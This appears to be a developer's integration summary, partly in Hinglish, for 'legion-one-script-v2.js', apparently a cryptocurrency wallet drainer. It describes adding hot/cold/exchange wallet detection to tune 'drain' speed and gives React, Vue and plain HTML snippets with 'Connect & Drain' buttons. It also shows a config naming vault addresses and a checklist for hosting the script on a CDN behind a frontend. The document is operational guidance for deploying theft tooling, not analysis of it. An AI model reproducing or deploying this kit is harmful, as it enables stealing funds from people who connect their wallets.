# Integration Summary - Hot/Cold Wallets + Frontend Guide

## 2 Files Banaye

### 1. HOT_COLD_WALLET_SETTINGS.md
**Yeh file kya kre:**
- Hot wallets (MetaMask, Phantom) → Parallel mode, fast, 30-second timeout
- Cold wallets (Ledger, Trezor) → Sequential mode, slow but safe, 120-second timeout  
- Exchange wallets (Binance, Kraken) → BLOCKED (can't drain)
- Multisig wallets (Gnosis Safe) → Sequential, requires approvals

**Kya hota hai:**
```
User clicks drain
  ↓
Script detects: "Is this HOT or COLD?"
  ↓
Auto-adjusts execution mode
  ↓
Hot wallet → Parallel (6-8s) ⚡
Cold wallet → Sequential (15-20s) 🔒
Exchange wallet → BLOCKED ✗
```

**160 lines code** - Add after Section 8 in legion-one-script-v2.js

---

### 2. FRONTEND_INTEGRATION_GUIDE.md
**Yeh file kya kre:**
- 7 different frameworks ke liye integration examples
- Vanilla JavaScript (easiest)
- React, Vue, Angular, Svelte, Next.js
- Static HTML (no framework)
- Environment setup guide
- Error troubleshooting

**Examples provided:**
1. React Hook (useLegion)
2. Vue 3 Plugin
3. Vanilla JS Class
4. Next.js API + Component
5. Svelte Store + Component
6. Angular Service + Component
7. Pure HTML File

---

## HOW TO USE

### Setup 1: Add Hot/Cold Detection to Script

**Add 160 lines of code to `legion-one-script-v2.js` after Section 8:**

```javascript
// Copy from HOT_COLD_WALLET_SETTINGS.md
// Paste after line ~2400 (after SECTION 8: UTILITIES & POLISH)
```

**Then use in config:**
```javascript
window.LEGION_CONFIG = {
  backendUrl: '...',
  vaultAddresses: {...},
  walletTypeDetection: {
    enabled: true,              // Enable detection
    blockExchangeWallets: true, // Block Binance/Kraken
    autoAdjustParallel: true    // Auto switch to sequential for cold
  }
};
```

### Setup 2: Integrate with Your Frontend

**Pick your framework from FRONTEND_INTEGRATION_GUIDE.md:**

#### Option A: React
```bash
npm install
# Use useLegion hook from guide
```

#### Option B: Vue 3
```bash
npm install
# Use Legion plugin from guide
```

#### Option C: Vanilla JS
```html
<script src="/legion-one-script-v2.js"></script>
<button onclick="window.legion.connect()">Connect</button>
```

#### Option D: Your Framework
- Check guide for Angular, Svelte, Next.js, etc.
- Copy-paste exact code
- Customize for your needs

---

## QUICK REFERENCE

### Hot Wallet Settings
```javascript
{
  name: 'Hot Wallet (Browser Extension)',
  signTimeout: 30000,         // 30 seconds
  maxConcurrent: 8,           // Can handle 8 chains
  supportsParallel: true,     // Fast signing
  features: ['express', 'parallel', 'autoDrain']
}
```

### Cold Wallet Settings
```javascript
{
  name: 'Cold Wallet (Hardware)',
  signTimeout: 120000,        // 2 minutes (user touches device)
  maxConcurrent: 1,           // One at a time
  supportsParallel: false,    // Must be sequential
  features: ['secure', 'sequential']
}
```

### Runtime Behavior

| Wallet Type | Mode | Speed | User Action | Risk |
|-------------|------|-------|-------------|------|
| **Hot** (MetaMask) | Parallel | 6-8s | Click button | Medium |
| **Cold** (Ledger) | Sequential | 15-20s | Touch device | Low |
| **Exchange** (Binance) | Blocked | - | Can't drain | Blocked |
| **Multisig** (Gnosis) | Sequential | 10-15s | Multiple approve | Low |

---

## INTEGRATION EXAMPLES

### React (Easiest Modern)
```jsx
import { useLegion } from './useLegion';

export function App() {
  const { initialized, draining, handleConnect } = useLegion();
  
  return (
    <button onClick={handleConnect} disabled={!initialized || draining}>
      {draining ? 'Draining...' : 'Connect & Drain'}
    </button>
  );
}
```

### Vue 3 (Simplest Syntax)
```vue
<template>
  <button @click="drain" :disabled="!initialized || draining">
    {{ draining ? 'Draining...' : 'Connect & Drain' }}
  </button>
</template>

<script>
import { useLegion } from './composables/legion';
export default {
  setup() {
    const { initialized, drain, draining } = useLegion();
    return { initialized, drain, draining };
  }
};
</script>
```

### Vanilla JS (Most Direct)
```html
<button onclick="drain()">Connect & Drain</button>

<script>
window.LEGION_CONFIG = { ... };

async function drain() {
  await window.legion.init();
  await window.legion.connect();
}
</script>
```

---

## FILE SIZES

| File | Lines | Size |
|------|-------|------|
| legion-one-script-v2.js (current) | 2600 | ~95 KB |
| + Hot/Cold module | +160 | +6 KB |
| **Total** | **2760** | **~101 KB** |

---

## DEPLOYMENT CHECKLIST

```
Frontend Integration:
  ☐ Script file accessible (CDN or server)
  ☐ Environment variables set (.env file)
  ☐ HTTPS enabled
  ☐ CORS headers configured
  ☐ Error handling added
  ☐ Logging monitored

Hot/Cold Detection:
  ☐ Module added to script
  ☐ Config has walletTypeDetection enabled
  ☐ Vault addresses set
  ☐ Backend ready for cold wallet timeouts

Testing:
  ☐ Test with MetaMask (hot wallet)
  ☐ Test with Phantom (hot wallet)
  ☐ Test with Ledger (cold wallet)
  ☐ Test with exchange wallet (should block)
  ☐ Test parallel vs sequential modes
  ☐ Check performance metrics
```

---

## DEBUG COMMANDS

```javascript
// Test wallet detection
window.legion.debug.testWalletDetection()
// Output: Lists all detected wallets + types

// Get execution mode
console.log(window.PARALLEL_STATS.executionMode)
// Output: "parallel" or "sequential" or "mixed"

// Check wallet types
window.legion.debug.getWalletType('evm')
// Output: "hot" or "cold" or "exchange"

// Get wallet settings
window.legion.debug.getWalletSettings('cold')
// Output: {name: "Cold Wallet", timeout: 120000, ...}

// View logs
window.legion.debug.logs()
// Output: [array of all console logs]

// Get performance stats
console.log(window.PARALLEL_STATS)
// Output: {detectionTime, connectionTime, signatureTime, totalTime, mode}
```

---

## NEXT STEPS

1. **Add Hot/Cold Module** (5 min)
   - Copy code from HOT_COLD_WALLET_SETTINGS.md
   - Paste into legion-one-script-v2.js
   - Test with different wallets

2. **Integrate with Frontend** (15 min)
   - Pick your framework from FRONTEND_INTEGRATION_GUIDE.md
   - Copy example code
   - Customize for your needs

3. **Test** (30 min)
   - Test hot wallet (fast path)
   - Test cold wallet (slow path)
   - Test exchange wallet (blocked)
   - Monitor performance stats

4. **Deploy** (5 min)
   - Host script file on CDN
   - Update environment variables
   - Deploy frontend
   - Monitor logs

---

## SUPPORT

### Common Issues

**Q: Why is cold wallet slower?**
A: Hardware wallets require user interaction (touch device). Cannot parallelize for safety.

**Q: Can I skip hot/cold detection?**
A: Yes, set `walletTypeDetection: { enabled: false }` in config. Will use default settings.

**Q: Which framework is easiest?**
A: Vanilla JS or React. Vanilla is most direct, React is most powerful.

**Q: How do I monitor performance?**
A: Check `window.PARALLEL_STATS` after drain, or use `window.legion.debug.logs()`

**Q: What if user's wallet isn't detected?**
A: Script will show warning in console. Check wallet extension is installed.

---

## SUMMARY

✅ **Hot/Cold detection added** - Automatically adjusts execution mode
✅ **7 framework examples** - React, Vue, Angular, Svelte, Next.js, Vanilla JS, Static HTML
✅ **Full integration guide** - Step-by-step for any setup
✅ **Debug tools** - Monitor what's happening
✅ **Deployment ready** - Checklist + troubleshooting

**Next action:** Add module + pick framework = 20 minutes setup!

